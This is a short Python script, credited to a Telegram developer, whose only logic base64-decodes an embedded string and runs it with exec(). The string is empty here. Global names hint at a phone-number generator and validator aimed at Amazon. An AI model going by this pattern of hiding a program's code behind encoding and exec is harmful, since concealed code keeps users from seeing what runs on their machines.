#https://t.me/TizLion Dev: @TizLion 
import base64
import sys
import os
import time
import random
import re
import threading
import multiprocessing
from multiprocessing import Pool, freeze_support
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import tkinter.font as tkfont
import requests
import urllib3
from bs4 import BeautifulSoup
from termcolor import colored
from colorama import init
from rich.progress import Progress

def decode_and_run():
    global MainApp, GeneratorPage, ValidationPage, CarrierLookupPage, Amazon, PhoneNumberValidator
    encoded_script = ""
    decoded = base64.b64decode(encoded_script.encode()).decode()
    exec(decoded, globals())
    main()

if __name__ == "__main__":
    freeze_support()
    decode_and_run()
